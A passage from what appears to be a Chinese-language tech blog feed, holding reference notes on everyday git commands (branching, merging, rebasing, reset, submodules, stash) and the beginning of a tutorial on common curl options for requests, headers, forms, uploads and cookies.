log</td><td>版本提交记录，以当前HEAD的位置为最新（HEAD之后的不显示）</td><td>–pretty&#x3D;oneline</td><td></td></tr><tr><td></td><td></td><td>–oneline</td><td></td></tr><tr><td>git reflog</td><td>可以查看到所有的记录</td><td>–pretty&#x3D;oneline</td><td></td></tr><tr><td></td><td></td><td>–oneline</td><td></td></tr><tr><td>[[git gc]]</td><td>清理不必要的文件并优化本地库</td><td></td><td></td></tr><tr><td>git diff</td><td>比较缓冲池中的文件和最近提交的差别</td><td>HEAD &lt;文件&gt;</td><td>和历史记录比较</td></tr><tr><td></td><td></td><td>&lt;文件&gt;</td><td>和缓冲池进行比较</td></tr><tr><td></td><td></td><td>None</td><td>比较所有文件</td></tr><tr><td>git clean</td><td>删除未被跟踪的文件</td><td>-n</td><td>先看看会删掉哪些文件</td></tr><tr><td></td><td></td><td>-f</td><td>删除 untracked files</td></tr><tr><td></td><td></td><td>-fd</td><td>连 untracked 的目录也一起删掉</td></tr><tr><td></td><td></td><td>-xfd</td><td>连 gitignore 的untrack 文件&#x2F;目录也一起删掉 （慎用，一般这个是用来删掉编译出来的 .o之类的文件用的）</td></tr></tbody></table><h1 id="冲突处理"><a href="#冲突处理" class="headerlink" title="冲突处理"></a>冲突处理</h1><h2 id="标识符号"><a href="#标识符号" class="headerlink" title="标识符号"></a>标识符号</h2><p>《表示当前分支<br>》表示合并分区<br>中间的内容就是不同，用&#x3D;&#x3D;&#x3D;分割</p><h1 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h1><h2 id="建立tracking关系"><a href="#建立tracking关系" class="headerlink" title="建立tracking关系"></a>建立tracking关系</h2><h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>默认建立master追踪origin&#x2F;master分支。</p><h2 id="branch方式"><a href="#branch方式" class="headerlink" title="branch方式"></a>branch方式</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git branch --set-upstream master origin/next</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立追踪关系之后可以直接使用git pull来更新</span></span><br></pre></td></tr></table></figure><h2 id="手动建立tracking"><a href="#手动建立tracking" class="headerlink" title="手动建立tracking"></a>手动建立tracking</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#建立跟踪分支，并进行拉取</span></span><br><span class="line">git checkout -b  foo  o/master</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><p>或者通过如下建立：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#如果当前在foo分支上可以省略foo</span></span><br><span class="line">git branch -u o/master foo</span><br></pre></td></tr></table></figure><h1 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h1><p>远程管理。</p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-o</td><td>git默认将远程主机命名为origin，通过该参数可以修改</td></tr><tr><td>show &lt;主机名&gt;</td><td>查看主机信息</td></tr><tr><td>add &lt;主机名&gt;&lt;网站&gt;</td><td>添加主机</td></tr><tr><td>rm &lt;主机名&gt;</td><td>删除主机</td></tr><tr><td>rename &lt;旧&gt;&lt;新&gt;</td><td>改名</td></tr><tr><td>-v</td><td>列出远程主机网站</td></tr></tbody></table><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch"></a>fetch</h2><blockquote><p>获取更新但是不合并。只对o&#x2F;master进行更新。不会影响本地的开发代码。</p></blockquote><p>会移动o&#x2F;master分支前进。</p><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>None</td><td>没有指定参数默认更新所有的分支，指定则更新指定分支</td></tr><tr><td>&lt;主机名&gt;</td><td>将远程的全部更新提取到本地</td></tr><tr><td>&lt;主机名&gt; &lt;分支名&gt;</td><td>取回的分支将以‘主机名&#x2F;分支名’形式读取</td></tr><tr><td>git fetch origin :bugFix</td><td>会在本地新建一个bugFix分支获取</td></tr></tbody></table><h2 id="拉取更新pull"><a href="#拉取更新pull" class="headerlink" title="拉取更新pull"></a>拉取更新pull</h2><p>拉取远程分支并合并。</p><blockquote><p>pull就是git fetch+git merge。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#与当前分支合并的时候可以省略：本地名</span></span><br><span class="line">git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">#等同于</span></span><br><span class="line">git fetch origin</span><br><span class="line">git merge origin/next</span><br></pre></td></tr></table></figure><h1 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h1><p>先fetch抓取然后就可以用分支名来进行合并。可以通过以下三种中的一种进行合并：</p><ol><li>git cherry-pick o&#x2F;master</li><li>git rebase o&#x2F;master</li><li>git merge o&#x2F;master</li></ol><h2 id="推送更新push"><a href="#推送更新push" class="headerlink" title="推送更新push"></a>推送更新push</h2><blockquote><p>除了更新远程也会将o&#x2F;master更新到当前节点。</p></blockquote><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-u</td><td>用来设置第一次推送的默认主机</td></tr><tr><td>&lt;远程主机名&gt;   &lt;本地分支名&gt;:&lt;远程分支名&gt;</td><td>将本地指定分支推送到远程指定分支</td></tr><tr><td>git push origin master</td><td>可以省略远程分支名</td></tr><tr><td>git push origin :master；或者使用：git push origin –delete master</td><td>省略本地分支名时表示删除指定的远程分支，等同于推送一个空的本地分支到远程</td></tr><tr><td>git push origin</td><td>分支名都可以省略</td></tr><tr><td>git push</td><td>直接追踪默认主机</td></tr></tbody></table><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><blockquote><p>HEAD指针表示当前所在的位置，在提交的记录的时候必须要跟随分支名。</p></blockquote><p>指针以HEAD为主，除非分离指针，不然分支名会跟随HEAD移动。</p><h1 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h1><p>固定不动的版本号。称为标签但是可以理解为静态的指针，不会随HEAD移动，起到锚点的作用。</p><h1 id="describe"><a href="#describe" class="headerlink" title="describe"></a>describe</h1><p>与tag相关，用来描述离你最近的锚点（也就是标签）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#输出：最近的tag_距离_当前版本的hash值</span></span><br><span class="line">git describe 版本号（未指定为当前HEAD位置）</span><br></pre></td></tr></table></figure><h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><h2 id="checkout"><a href="#checkout" class="headerlink" title="checkout"></a>checkout</h2><p>移动HEAD，既能实现分支的切换也可以实现将HEAD指针单独移动。<br>当使用分支名作为参数时，表示切换到指定分支，HEAD会跟随指针移动。<br>当使用节点标识作为参数时，会分离HEAD，HEAD将脱离具体分支进行操作。</p><h2 id="branch"><a href="#branch" class="headerlink" title="branch"></a>branch</h2><table><thead><tr><th>参数</th><th>功能</th></tr></thead><tbody><tr><td>-v</td><td>查看本地分支</td></tr><tr><td>-r</td><td>查看远程分支</td></tr><tr><td>-a</td><td>查看所有分支</td></tr><tr><td>-f master HEAD~3</td><td>能不依靠HEAD指针进行分支回溯</td></tr><tr><td>name</td><td>创建分支</td></tr><tr><td>git branch -u o&#x2F;master foo</td><td>建立远程track关系</td></tr><tr><td>-d</td><td>删除分支</td></tr><tr><td>-D</td><td>强制删除一个分支</td></tr><tr><td>git branch -m oldName newName</td><td>分支重命名</td></tr></tbody></table><h2 id="分支合并"><a href="#分支合并" class="headerlink" title="分支合并"></a>分支合并</h2><h2 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h2><p>需要切换到要合并的分支，然后将指定的分支合并到该分支上。</p><h3 id="分支名"><a href="#分支名" class="headerlink" title="分支名"></a>分支名</h3><p>merge &lt;分支名&gt;：将指定分支合并到当前分支，会保留合并分支等信息<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648089921577_0.png" alt="image.png"></p><h3 id="冲突合并"><a href="#冲突合并" class="headerlink" title="冲突合并"></a>冲突合并</h3><p>两个分支上都对同一个文件进行了修改导致系统无法决定使用哪个修改结果，需要人为选择。两个文件的修改都会出现在当前的文件中，通过手动保留要修改的部分，删除掉表示来自于哪个分支的标志。之后通过git add+git commit合并。</p><h4 id="rebase"><a href="#rebase" class="headerlink" title="rebase"></a>rebase</h4><p>rebase的合并方式是线性的。</p><h4 id="分支名-1"><a href="#分支名-1" class="headerlink" title="分支名"></a>分支名</h4><p>**git rebase &lt;分支名&gt;**：会将2条分支的版本合并形成一条记录。将当前的分支按线性拼接到指定分支的之前。</p><blockquote><p>merge不同，merge会创建一个新的节点作为合并的节点。</p></blockquote><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648090090084_0.png" alt="image.png"></p><h4 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h4><p><strong>git rebase continue</strong>: 出现冲突的时候代替commit命令使用。</p><h4 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h4><p><strong>git rebase -i HEAD~4</strong>：图形化改变顺序，可以使用undo和reset撤销,不会计入节点</p><h4 id="abort"><a href="#abort" class="headerlink" title="abort"></a>abort</h4><p><strong>git rebase abort</strong>：在任何时候都可以使用其来终止rebase的行为，回到rebase之前的状态。</p><h4 id="cherry-pick"><a href="#cherry-pick" class="headerlink" title="cherry-pick"></a>cherry-pick</h4><p>节点复制迁移指令，将提交的节点复制到指定的分支下。<br>举例来说，代码仓库有master和feature两个分支：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a b c d   Master</span><br><span class="line">\</span><br><span class="line">e f g Feature</span><br></pre></td></tr></table></figure><p>现在通过在master分支下执行git cherry-pick f，将会将f提交到master分支下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a b c d f   Master</span><br><span class="line">\</span><br><span class="line">e f g Feature</span><br></pre></td></tr></table></figure><h1 id="版本操作"><a href="#版本操作" class="headerlink" title="版本操作"></a>版本操作</h1><blockquote><p>每次提交记录或者对节点修改才会生成新阶段，移动指针不会。</p></blockquote><h2 id="reset"><a href="#reset" class="headerlink" title="reset"></a>reset</h2><p>回溯操作。</p><h3 id="hard"><a href="#hard" class="headerlink" title="hard"></a>hard</h3><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>git reset hard <hash></td><td>移动HEAD,重置暂存区,重置工作区</td></tr><tr><td>git reset hard HEAD^</td><td>回退一格</td></tr><tr><td>git reset hard HEAD~1</td><td>回退一格</td></tr><tr><td>git reset  hard HEAD</td><td>重置当前的修改</td></tr></tbody></table><h3 id="soft"><a href="#soft" class="headerlink" title="soft"></a>soft</h3><p>仅仅在本地库移动HEAD指针</p><h3 id="revert"><a href="#revert" class="headerlink" title="revert"></a>revert</h3><p>撤销操作，会将指定的节点（指定的commit内容）从当前分支上撤销。这里有2种情况，多分支合并的节点和线性情况。</p><blockquote><p>会生成一个新的节点，这个节点存了将某个节点撤销的操作，所以虽然指定的节点还在但是因为这个节点的原因无法被访问了。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git revert -m <span class="string">&quot;&quot;</span> 标识</span><br></pre></td></tr></table></figure><p>当是多分支的时候:<br><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648090362955_0.png" alt="image.png"></p><h1 id="子模块"><a href="#子模块" class="headerlink" title="子模块"></a>子模块</h1><blockquote><p>submodule</p></blockquote><p>可以通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git submodule add &lt;url&gt; &lt;本地子库名&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过上式可以会生成.gitsubmodule文件，会在当前的文件位置生成</span></span><br></pre></td></tr></table></figure><p>的方式直接拷贝一个git库作为本库的一个依赖库，但是通过这种方式，会直接对子库进行git clone操作。</p><h2 id="载入子库"><a href="#载入子库" class="headerlink" title="载入子库"></a>载入子库</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>可以在git clone的时候进行：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;url&gt; --recurse-submodules</span><br></pre></td></tr></table></figure><p>进行同时克隆。</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git submodule init</span><br><span class="line">git submodule update</span><br></pre></td></tr></table></figure><p>先克隆主库，然后单独对子库进行更新克隆操作。</p><h1 id="recursive"><a href="#recursive" class="headerlink" title="recursive"></a>recursive</h1><blockquote><p>循环克隆子库</p></blockquote><p>当一个库还包含其他库的时候，使用这个命令可以将子库也都拷贝下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --recursive &lt;库&gt;</span><br></pre></td></tr></table></figure><h1 id="gitignore"><a href="#gitignore" class="headerlink" title="gitignore"></a>gitignore</h1><p>⚠️ 一定要在一开始就将不跟踪的对象写进入，不然后续无论在这里写啥都没有用了</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/文件 ：只隔离根目标下的指定文件</span><br><span class="line">文件/： 隔离所有指定文件</span><br><span class="line">可以使用通配符</span><br><span class="line">*文件 ：所有指定名字的文件都不跟踪</span><br></pre></td></tr></table></figure><h1 id="高级操作"><a href="#高级操作" class="headerlink" title="高级操作"></a>高级操作</h1><h2 id="自动纠正输入错误"><a href="#自动纠正输入错误" class="headerlink" title="自动纠正输入错误"></a>自动纠正输入错误</h2><p>需要进行设置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global help.autocorrect 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果不想对全局生效的话，只需要去除-global</span></span><br></pre></td></tr></table></figure><p>之后当输入错误的时候，Git 直接运行了它建议命令的第一个，也就是 git status，而不是给你展示它所建议的子命令。</p><h2 id="给未追踪的文件来个备份"><a href="#给未追踪的文件来个备份" class="headerlink" title="给未追踪的文件来个备份"></a>给未追踪的文件来个备份</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648090507647_0.png" alt="image.png"></p><h2 id="浏览另一个分支的文件"><a href="#浏览另一个分支的文件" class="headerlink" title="浏览另一个分支的文件"></a>浏览另一个分支的文件</h2><p><img src="https://hexo-logseq.oss-cn-hangzhou.aliyuncs.com/image_1648090528750_0.png" alt="image.png"></p><h2 id="Git-中的搜索"><a href="#Git-中的搜索" class="headerlink" title="Git 中的搜索"></a>Git 中的搜索</h2><p>用一个简单的命令你就能在 Git 中像专业人士一样搜索了。更有甚者，尽管你不确定你的修改在哪次提交或者哪个分支上，你依然能搜索。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rev-list --all | xargs git grep -F <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>例如，假设你想在你的仓库中搜索字符串 “font-size: 52 px;” ：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rev-list –all | xargs git grep -F ‘font-size: 52 px;’F3022…9e12:HtmlTemplate/style.css: font-size: 52 px;E9211…8244:RR.Web/Content/style/style.css: font-size: 52 px;</span><br></pre></td></tr></table></figure><h2 id="git暂存修改不提交"><a href="#git暂存修改不提交" class="headerlink" title="git暂存修改不提交"></a>git暂存修改不提交</h2><blockquote><p>当出现修改的内容还不想提交成为一次记录，但是又想要切换到其他分支进行作业的时候，很好用</p></blockquote><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>git stash</td><td>将当前的修改暂存起来。经过这个操作修改的内容类似与被丢弃了，但是其实是存起来了。当前也是看不到的，所以git status会显示没有修改。</td></tr><tr><td>git stash list</td><td>展示暂存的信息</td></tr><tr><td>git stash pop</td><td>将暂存的结果取出来</td></tr><tr><td>git stash clear</td><td>将暂存丢弃</td></tr><tr><td>git help stash</td><td>查看git stash的可用命令</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>curl</title>
      <link href="/2022/04/18/curl/"/>
      <url>/2022/04/18/curl/</url>
      
        <content type="html"><![CDATA[<blockquote><p>curl 是常用的命令行工具，用来请求 Web 服务器。它的名字就是客户端（client）的 URL 工具的意思。作用是发出网络请求，然后得到和提取数据，显示在”标准输出”（stdout）上面。</p></blockquote><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><p>这里主要介绍常见的使用参数。</p><h2 id="查看网页源码-x3D-O-o"><a href="#查看网页源码-x3D-O-o" class="headerlink" title="查看网页源码&#x3D;O|o|"></a>查看网页源码&#x3D;O|o|</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl www.sina.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl -o [文件名] www.sina.com 会保存显示的内容保存下来，相当于使用wget命令了</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">curl -O www.sina.com <span class="comment"># 不需要指定文件名，将 URL 的最后部分当作文件名</span></span></span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　　&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">　　&lt;html&gt;&lt;head&gt;</span><br><span class="line">　　&lt;title&gt;301 Moved Permanently&lt;/title&gt;</span><br><span class="line">　　&lt;/head&gt;&lt;body&gt;</span><br><span class="line">　　&lt;h1&gt;Moved Permanently&lt;/h1&gt;</span><br><span class="line">　　&lt;p&gt;The document has moved &lt;a href=&quot;http://www.sina.com.cn/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">　　&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="自动跳转-x3D-L"><a href="#自动跳转-x3D-L" class="headerlink" title="自动跳转&#x3D;L"></a>自动跳转&#x3D;L</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L www.sina.com</span><br><span class="line"># 对于自动跳转的网址，使用L参数，curl会自动跳转到新的网址。</span><br><span class="line"># -&gt; 结果就自动跳转为www.sina.com.cn</span><br></pre></td></tr></table></figure><h2 id="显示头信息-x3D-i"><a href="#显示头信息-x3D-i" class="headerlink" title="显示头信息&#x3D;i"></a>显示头信息&#x3D;i</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -i www.sina.com</span><br><span class="line"># 可以显示http response的头信息，连同网页代码一起</span><br><span class="line">curl -I www.sina.com</span><br><span class="line"># 只显示http response的头信息</span><br></pre></td></tr></table></figure><h2 id="显示通信过程-x3D-v"><a href="#显示通信过程-x3D-v" class="headerlink" title="显示通信过程&#x3D;v"></a><strong>显示通信过程</strong>&#x3D;v</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -v www.sina.com</span><br><span class="line"># 显示一次http通信的整个过程，包括端口连接和http request头信息。</span><br><span class="line"># 也可以使用以下的方式获得更全的内容</span><br><span class="line">curl --trace output.txt www.sina.com</span><br><span class="line">curl --trace-ascii output.txt www.sina.com</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">　　* About to connect() to www.sina.com port 80 (#0)</span><br><span class="line">　　* Trying 61.172.201.195... connected</span><br><span class="line">　　* Connected to www.sina.com (61.172.201.195) port 80 (#0)</span><br><span class="line"><span class="meta prompt_">　　&gt; </span><span class="language-bash">GET / HTTP/1.1</span></span><br><span class="line"><span class="meta prompt_">　　&gt; </span><span class="language-bash">User-Agent: curl/7.21.3 (i686-pc-linux-gnu) libcurl/7.21.3 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.18</span></span><br><span class="line"><span class="meta prompt_">　　&gt; </span><span class="language-bash">Host: www.sina.com</span></span><br><span class="line"><span class="meta prompt_">　　&gt; </span><span class="language-bash">Accept: */*</span></span><br><span class="line"><span class="meta prompt_">　　&gt;</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">　　* HTTP 1.0, assume close after body</span></span><br><span class="line">　　&lt; HTTP/1.0 301 Moved Permanently</span><br><span class="line">　　&lt; Date: Sun, 04 Sep 2011 00:42:39 GMT</span><br><span class="line">　　&lt; Server: Apache/2.0.54 (Unix)</span><br><span class="line">　　&lt; Location: http://www.sina.com.cn/</span><br><span class="line">　　&lt; Cache-Control: max-age=3600</span><br><span class="line">　　&lt; Expires: Sun, 04 Sep 2011 01:42:39 GMT</span><br><span class="line">　　&lt; Vary: Accept-Encoding</span><br><span class="line">　　&lt; Content-Length: 231</span><br><span class="line">　　&lt; Content-Type: text/html; charset=iso-8859-1</span><br><span class="line">　　&lt; X-Cache: MISS from sh201-19.sina.com.cn</span><br><span class="line">　　&lt; Connection: close</span><br><span class="line">　　&lt;</span><br><span class="line">　　&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">　　&lt;html&gt;&lt;head&gt;</span><br><span class="line">　　&lt;title&gt;301 Moved Permanently&lt;/title&gt;</span><br><span class="line">　　&lt;/head&gt;&lt;body&gt;</span><br><span class="line">　　&lt;h1&gt;Moved Permanently&lt;/h1&gt;</span><br><span class="line">　　&lt;p&gt;The document has moved &lt;a href=&quot;http://www.sina.com.cn/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">　　&lt;/body&gt;&lt;/html&gt;</span><br><span class="line">　　* Closing connection #0</span><br></pre></td></tr></table></figure><h2 id="发送表单信息"><a href="#发送表单信息" class="headerlink" title="发送表单信息"></a><strong>发送表单信息</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 发送表单信息有GET和POST两种方法。GET方法相对简单，只要把数据附在网址后面就行。</span><br><span class="line">curl example.com/form.cgi?data=xxx</span><br><span class="line"># POST方法必须把数据和网址分开，curl就要用到--data参数。</span><br><span class="line">curl -X POST --data &quot;data=xxx&quot; example.com/form.cgi</span><br><span class="line"># 如果你的数据没有经过表单编码，还可以让curl为你编码，参数是`--data-urlencode`</span><br><span class="line">curl -X POST--data-urlencode &quot;date=April 1&quot; example.com/form.cgi</span><br></pre></td></tr></table></figure><h2 id="HTTP动词-x3D-X"><a href="#HTTP动词-x3D-X" class="headerlink" title="HTTP动词&#x3D;X"></a><strong>HTTP动词</strong>&#x3D;X</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># curl默认的HTTP动词是GET，使用`-X`参数可以支持其他动词。</span><br><span class="line">curl -X POST www.example.com</span><br><span class="line">curl -X DELETE www.example.com</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a><strong>文件上传</strong></h2><p>假定文件上传的表单是下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">　　&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.cgi&quot;&gt;</span><br><span class="line">　　　　&lt;input type=file name=upload&gt;</span><br><span class="line">　　　　&lt;input type=submit name=press value=&quot;OK&quot;&gt;</span><br><span class="line">　　&lt;/form&gt;</span><br><span class="line"># 你可以用curl这样上传文件</span><br><span class="line">curl --form upload=@localfilename --form press=OK [URL]</span><br></pre></td></tr></table></figure><h2 id="Referer字段"><a href="#Referer字段" class="headerlink" title="Referer字段"></a><strong>Referer字段</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 有时你需要在http request头信息中，提供一个referer字段，表示你是从哪里跳转过来的</span><br><span class="line">curl --referer http://www.example.com http://www.example.com</span><br></pre></td></tr></table></figure><h2 id="User-Agent字段-x3D-A"><a href="#User-Agent字段-x3D-A" class="headerlink" title="User Agent字段&#x3D;A"></a><strong>User Agent字段</strong>&#x3D;A</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># iPhone4的User Agent</span><br><span class="line">　　Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293 Safari/6531.22.7</span><br><span class="line">curl --user-agent &quot;[User Agent]&quot; [URL]</span><br><span class="line"># 通过 A 将User-Agent改成 Chrome 浏览器</span><br><span class="line">curl -A &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36&#x27; https://google.com</span><br><span class="line"># 移除User-Agent标头</span><br><span class="line">curl -A &#x27;&#x27; https://google.com</span><br><span class="line"># 直接指定标头，更改User-Agent</span><br><span class="line">curl -H &#x27;User-Agent: php/1.0&#x27; https://google.com</span><br></pre></td></tr></table></figure><h2 id="cookie-x3D-b-c"><a href="#cookie-x3D-b-c" class="headerlink" title="cookie&#x3D;b|c"></a><strong>cookie</strong>&#x3D;b|c</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">具体的cookie的值，可以从http response头信息的`Set-Cookie`字段中得到</span></span><br><span class="line">curl --cookie &quot;name=xxx&quot; www.example.com</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将服务器设置的 Cookie 写入一个文件,将服务器的 HTTP 回应所设置 Cookie 写入文本文件cookies.txt</span></span><br><span class="line">curl -c cookies.txt https://www.google.com</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发送 POST 请求的数据体。HTTP 请求会自动加上标头Content-Type : application/x-www-form-urlencoded。并且会自动将请求转为 POST 方法，因此可以省略-X POST。</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d<span class="string">&#x27;login=emma＆password=123&#x27;</span>-X POST https://google.com/login</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span 